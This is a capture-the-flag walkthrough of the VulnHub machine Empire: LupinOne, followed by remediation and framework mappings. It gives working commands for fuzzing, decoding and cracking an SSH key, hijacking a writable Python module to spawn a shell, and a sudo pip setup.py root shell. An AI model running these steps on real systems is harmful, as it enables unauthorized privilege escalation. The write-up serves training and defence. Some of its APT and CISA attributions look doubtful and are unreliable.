# Empire: LupinOne — The Gentleman Thief Gets Rooted

Inspired by the master thief Arsène Lupin, this machine hides its secrets in plain sight, encoded in obscure formats. You find a hidden web directory, decode a Base58-encoded SSH private key, crack its passphrase, get in as `icex64`, hijack a Python library module to pivot to `arsene`, and finally abuse `sudo pip` to install your way to root. Three distinct privilege escalation techniques in one smooth chain. Slept on box, legit goated design. 🎩

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Empire: LupinOne |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/empire-lupinone,750/ |
| **Techniques** | Web directory fuzzing, Base58 encoding bypass, SSH key cracking (ssh2john + John the Ripper), Python library hijacking, sudo pip GTFOBins |
| **CVEs** | CWE-522 (Insufficiently Protected Credentials — SSH private key in web-accessible directory), CWE-427 (Uncontrolled Search Path Element — writable Python library module), CWE-269 (Improper Privilege Management — sudo pip as root) |
| **APT Groups** | APT28: uses obscure encoding (Base58, Base64) to hide payloads and credentials in web-accessible paths; Lazarus Group: exploits Python library path manipulation for lateral movement in post-exploitation phases |

---

## Attack Summary

```
nmap: SSH (22), HTTP (80)
    |
    v
/~myfiles/ → 404, HTML source comment → hint to keep looking
    |
    v
ffuf → /~secret/ discovered
    |
    v
ffuf on /~secret/ → mysecret.txt found
    |
    v
cat mysecret.txt → Base58-encoded SSH private key for icex64
    |
    v
base58 decode → PEM private key
    |
    v
ssh2john + john → passphrase: P@55w0rd!
    |
    v
ssh -i id_rsa icex64@target
    |
    v
sudo -l → (arsene) NOPASSWD: python3.9 /home/arsene/heist.py
    |
    v
python3 -c "import webbrowser; print(webbrowser.__file__)"
    |
    v
nano /usr/lib/python3.9/webbrowser.py → inject os.system("/bin/bash") at top
    |
    v
sudo -u arsene python3.9 /home/arsene/heist.py → shell as arsene
    |
    v
sudo -l → (root) NOPASSWD: /usr/bin/pip
    |
    v
GTFOBins pip: echo "import os; os.execl('/bin/sh','sh',...)" > setup.py → sudo pip install
    |
    v
uid=0(root) → /root/root.txt
```

---

## Methodology

1. Network scan: SSH (22) and HTTP (80)
2. Web source code review: find HTML comment hinting at hidden paths
3. Directory fuzzing with ffuf to discover `/~secret/`
4. Second fuzzing pass to find `mysecret.txt` (Base58-encoded SSH key)
5. Decode Base58 to recover the SSH private key
6. Crack SSH key passphrase with ssh2john and John the Ripper
7. SSH login as `icex64`
8. Check sudo permissions: `heist.py` runs as `arsene`
9. Python library hijacking via writable `webbrowser` module to gain `arsene` shell
10. Abuse `sudo pip` with GTFOBins technique to escalate to root

---

## Step 1 — Network Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.2

nmap -sV -sC 192.168.1.2
```

Expected output:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.x
80/tcp open  http    Apache httpd 2.4.x
```

Two services: SSH and HTTP. The web server will reveal the entire attack path.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration and Hidden Directory Discovery

Browse to `http://192.168.1.2/` — a themed page about Lupin. Inspect the HTML source:

```bash
curl -s http://192.168.1.2/ | grep -i "comment\|<!--\|hint"
```

There is an HTML comment pointing to look harder. The Apache `UserDir` module serves `/~<username>/` paths. Try `/~myfiles/`:

```
http://192.168.1.2/~myfiles/
```

Returns a 404, but check the page source. The 404 page contains a hint to keep looking. Something is hidden.

Fuzz for user directories using the tilde (`~`) pattern:

```bash
ffuf -u http://192.168.1.2/~FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200 \
  -t 40
```

Found: `/~secret` (200 OK)

**Real-world note:** Apache's `UserDir` module creates personal web space for system users at `/~username/`. When enabled in production, it can expose user-created content including sensitive files. Attackers routinely enumerate these paths during web application reconnaissance.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — Finding the SSH Private Key

The `/~secret/` directory is accessible but lists nothing obvious. Run a second fuzzing pass targeting file extensions:

```bash
ffuf -u http://192.168.1.2/~secret/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e .txt,.html,.php,.bak \
  -mc 200 \
  -t 40
```

Found: `mysecret.txt`

Download it:

```bash
wget http://192.168.1.2/~secret/mysecret.txt
cat mysecret.txt
```

The content is a long string — clearly encoded. It does not look like Base64 (no `=` padding, uses alphanumeric plus `123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz`). That is Base58: Bitcoin's encoding alphabet, often used in CTFs.

**Real-world note:** Encoding is not encryption. APT28 has been documented using Base58 and Base64 to obscure credential material in files left in web-accessible directories, expecting defenders to overlook non-Base64 encoded content. The encoding adds zero security while creating a false sense of protection.

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information

---

## Step 4 — Base58 Decode the SSH Private Key

Decode the content:

```bash
# Method 1: Python with base58 library
pip3 install base58 2>/dev/null
python3 -c "
import base58
with open('mysecret.txt', 'rb') as f:
    data = f.read().strip()
print(base58.b58decode(data).decode())
" > id_rsa

# Method 2: Use an online decoder (cyberchef.io) — paste content, select "From Base58"

# Method 3: Install base58 CLI
echo $(python3 -c "import base58; print(base58.b58decode(open('mysecret.txt').read().strip()).decode())")
```

The decoded output is a PEM-formatted RSA private key:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
...
-----END RSA PRIVATE KEY-----
```

The key is passphrase-protected. Time to crack it.

```bash
chmod 600 id_rsa
```

**MITRE ATT&CK:** T1552.004 — Credentials in Files: Private Keys

---

## Step 5 — SSH Key Passphrase Cracking

Convert the key to John the Ripper format:

```bash
python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
# Alternative path: /usr/bin/ssh2john

# Crack with rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

Passphrase recovered: `P@55w0rd!`

If rockyou does not crack it, try:

```bash
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash
john --wordlist=/usr/share/wordlists/fasttrack.txt id_rsa.hash
```

**Real-world note:** SSH private key passphrases should be at least 20 characters long with mixed character classes. P@55w0rd! is a classic leet-speak substitution pattern that falls to any wordlist containing password variations. Hardware security keys (YubiKey, FIDO2) eliminate the passphrase cracking attack surface entirely.

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking

---

## Step 6 — SSH Login as icex64

```bash
ssh -i id_rsa icex64@192.168.1.2
# Enter passphrase: P@55w0rd!

id
# uid=1000(icex64)

cat ~/user.txt  # if there is a user flag
```

Initial foothold as `icex64` established.

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH

---

## Step 7 — Sudo Enumeration

```bash
sudo -l
```

Output:

```
(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

icex64 can run `heist.py` as `arsene` using `python3.9`. The key question: what modules does `heist.py` import, and are any of them writable?

```bash
cat /home/arsene/heist.py
# The script imports 'webbrowser'
```

Find where the `webbrowser` module resolves:

```bash
python3 -c "import webbrowser; print(webbrowser.__file__)"
# Output: /usr/lib/python3.9/webbrowser.py
```

Check permissions:

```bash
ls -la /usr/lib/python3.9/webbrowser.py
# -rw-r--rw-  ... webbrowser.py  (or world-writable)
```

The module is writable. This is Python library hijacking via a writable module in the import path: CWE-427.

**Real-world note:** Python library hijacking is a documented post-exploitation technique. When a privileged script imports a module from a writable directory, the attacker can inject arbitrary code at the module level. This is especially dangerous in `sudo` contexts because the injected code runs as the `sudo` target user.

**MITRE ATT&CK:** T1574.006 — Hijack Execution Flow: Dynamic Linker Hijacking (analogous path hijacking)

---

## Step 8 — Python Library Hijacking to arsene

Inject a shell command at the beginning of `webbrowser.py`:

```bash
# Open the module and add the payload as the first line
# This runs before any other code in the module
python3 -c "
import os
content = open('/usr/lib/python3.9/webbrowser.py').read()
payload = 'import os; os.system(\"/bin/bash\")\n'
with open('/usr/lib/python3.9/webbrowser.py', 'w') as f:
    f.write(payload + content)
"
```

Alternatively, use a text editor:

```bash
nano /usr/lib/python3.9/webbrowser.py
# Add at the very top, line 1:
# import os; os.system("/bin/bash")
```

Trigger the hijack:

```bash
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
id
# uid=1001(arsene)
```

Shell as `arsene`. Noice! Now pivot again.

**MITRE ATT&CK:** T1574.006 — Hijack Execution Flow

---

## Step 9 — Privilege Escalation to Root via sudo pip

Check sudo permissions as `arsene`:

```bash
sudo -l
```

Output:

```
(root) NOPASSWD: /usr/bin/pip
```

`pip install` with root sudo is equivalent to unrestricted root code execution. Use the GTFOBins technique:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

What this does: `pip install` on a local directory with a `setup.py` executes `setup.py` as part of the install process. When run as root via sudo, `setup.py` runs as root.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

Root obtained. The gentleman thief got rooted. 🎩

**Alternative:** `echo "import pty; pty.spawn('/bin/bash')" > $TF/setup.py && sudo pip install $TF`

**Real-world note:** `pip install` as root is one of the cleanest GTFOBins escalations. Any package's `setup.py` runs as the installing user. Organizations that allow `sudo pip` in developer environments often do so for convenience during dependency management, but the security implication is total. Use virtual environments with restricted sudo instead.

**MITRE ATT&CK:** T1059.006 — Command and Scripting Interpreter: Python, T1548.003 — Abuse Elevation Control Mechanism: Sudo

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used/Cracked |
|---|---|---|---|
| SSH private key (Base58-encoded) | PEM RSA key for icex64 | `http://target/~secret/mysecret.txt` | SSH login as icex64 |
| SSH key passphrase | `P@55w0rd!` | Cracked with John the Ripper | SSH authentication as icex64 |
| User flag | Contents of user.txt | After SSH login | Proof of user |
| Root flag | Contents of `/root/root.txt` | After sudo pip GTFOBins | Final flag |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SSH private key in web-accessible directory | Sensitive files in web-accessible paths are a consistent pentest finding; encodings like Base58 provide zero protection | Never place sensitive credentials in web-accessible directories regardless of encoding; enforce strict file ACLs |
| 2 | Base58 encoding treated as security | Encoding is not encryption; any encoded content can be trivially decoded by an attacker | Use proper encryption (AES-256, RSA 4096) for sensitive material; encoding is for data transport, not security |
| 3 | Weak SSH key passphrase | Leet-speak substitutions are in every wordlist; weak passphrases negate the security of key-based authentication | Use 20+ character passphrases; consider hardware security keys (FIDO2/YubiKey) |
| 4 | Writable Python system library module | Python library hijacking via writable modules in privileged scripts is a documented post-exploitation technique | System Python library directories must be owned by root and not world-writable; use AppArmor/SELinux confinement for sudo Python scripts |
| 5 | sudo pip as root | pip install runs setup.py as the installing user; sudo pip = unrestricted root code execution | Never grant sudo pip; use virtual environments with restricted access; if dependency management requires elevated access, use pip with --user in a controlled virtualenv |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credential Access | Credentials in Files: Private Keys | T1552.004 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Defense Evasion | Defense Evasion | Obfuscated Files or Information | T1027 |
| Initial Access | Initial Access | Remote Services: SSH (with key) | T1021.004 |
| Privilege Escalation | Privilege Escalation | Hijack Execution Flow | T1574.006 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Execution | Execution | Command and Scripting Interpreter: Python | T1059.006 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove SSH key from web-accessible directory** — move all sensitive material outside the web root; enforce file permissions: `chmod 600 /home/icex64/.ssh/id_rsa`
2. **Disable Apache UserDir module** — `a2dismod userdir && systemctl reload apache2` — or ensure no sensitive files exist in any `~/public_html/` or `~/secret/` paths
3. **Use a strong SSH key passphrase** — minimum 20 characters; use `ssh-keygen -p -f ~/.ssh/id_rsa` to update the passphrase; consider hardware keys
4. **Fix Python library permissions** — `chown root:root /usr/lib/python3.9/webbrowser.py && chmod 644 /usr/lib/python3.9/webbrowser.py`; audit all writable system Python modules: `find /usr/lib/python3.9 -writable -type f 2>/dev/null`
5. **Remove sudo pip grant** — edit `/etc/sudoers` or the relevant sudoers.d file; replace with a virtual environment approach if dependency management requires elevated access
6. **Restrict sudo heist.py** — if the sudo rule for `heist.py` is legitimate, restrict the Python import path: `env_reset` and `secure_path` in sudoers prevent library hijacking

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all web-accessible directories and their contents |
| Protect | Access Control | Remove sudo pip; restrict sudo heist.py; enforce least privilege |
| Protect | Data Security | Remove SSH key from web; encrypt sensitive files properly; strong passphrases |
| Detect | Anomalies and Events | Alert on web requests to /~secret/; monitor Python library modifications; alert on sudo pip usage |
| Respond | Response Planning | Rotate SSH keys; remove key from web; revoke sudo pip; audit Python modules |
| Recover | Recovery Planning | Restore Python library files from backup; rotate all exposed credentials |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-6 | Least Privilege | Remove sudo pip; restrict sudo grants to minimum necessary |
| IA-5 | Authenticator Management | Require strong SSH key passphrases; rotate compromised SSH keys |
| CM-6 | Configuration Settings | Enforce correct permissions on Python system library directories |
| CM-7 | Least Functionality | Disable UserDir module if not needed; remove unused sudo grants |
| SC-28 | Protection of Information at Rest | Sensitive files must not be stored in web-accessible directories regardless of encoding |

### CISA KEV

Python library hijacking via writable modules (CWE-427) is a technique documented in CISA Advisory AA22-074A as a post-exploitation lateral movement mechanism. The sudo pip escalation maps to CISA guidance on restricting privileged package manager access in enterprise Linux environments.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Assets | MIL2 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (disable UserDir; fix Python module permissions)
- **D3-OAM** — Operating System Administrative Management (remove sudo pip; restrict sudo grants)
- **D3-HBPI** — Harden Build Pipeline Integrity (no sensitive credentials in web-accessible paths)

---

## Final Thoughts

Empire: LupinOne is a beautifully crafted machine that rewards patience and lateral thinking. The Base58 encoding is a deliberate misdirection: it looks weird enough to make you think it is something exotic, but it is just a different alphabet. The Python library hijacking is the standout technique: it is a real-world finding that shows up in enterprise environments when developers use writable system Python paths for shared modules.

The sudo pip escalation is the cleanest root you will ever get: one command, four lines, instant root. It looks almost too simple, which is exactly why it is so devastating in production. Always audit what `sudo -l` reveals, especially for package managers and interpreters.

Arsène Lupin would be proud. The gentleman thief got rooted by a better thief. 🎩

Thanks guys!! (❍ᴥ❍ʋ)
